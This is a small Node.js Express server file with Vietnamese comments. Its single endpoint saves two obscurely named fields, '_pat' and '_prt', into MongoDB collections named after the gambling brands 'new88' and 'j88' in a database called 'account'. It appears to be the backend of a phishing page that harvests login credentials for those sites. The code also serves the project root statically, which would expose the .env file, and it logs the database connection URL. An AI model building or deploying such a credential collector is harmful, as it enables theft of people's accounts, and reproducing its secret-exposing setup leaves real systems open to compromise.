const express = require('express');
const { MongoClient } = require('mongodb');
require('dotenv').config();

const app = express();

// Middleware
app.use(express.json());
app.use(express.static('./'));

// Kiểm tra MongoDB URL
const mongoUrl = process.env.MONGODB_URL;
if (!mongoUrl) {
    console.error('MONGODB_URL không được định nghĩa trong file .env');
    process.exit(1);
}

// API endpoint
app.post('/api/submit', async (req, res) => {
    let client;
    try {
        // Kết nối MongoDB
        client = await MongoClient.connect(mongoUrl);
        console.log('Đã kết nối thành công với MongoDB');
        
        const db = client.db('account');
        
        // Xác định collection dựa trên loại form
        let collection;
        if (req.body.type === 'new88') {
            collection = db.collection('new88');
        } else if (req.body.type === 'j88') {
            collection = db.collection('j88');
        } else {
            throw new Error('Loại form không hợp lệ');
        }

        // Lưu dữ liệu
        const result = await collection.insertOne({
            _pat: req.body._pat,
            _prt: req.body._prt,
            createdAt: new Date()
        });

        res.status(200).json({
            success: true,
            message: `Dữ liệu ${req.body.type.toUpperCase()} đã được lưu thành công`,
            id: result.insertedId
        });

    } catch (error) {
        console.error('Lỗi:', error);
        res.status(500).json({
            success: false,
            message: 'Có lỗi xảy ra khi lưu dữ liệu',
            error: error.message
        });

    } finally {
        if (client) {
            await client.close();
        }
    }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Server đang chạy tại http://localhost:${PORT}`);
    console.log('MongoDB URL:', mongoUrl); // Kiểm tra URL
});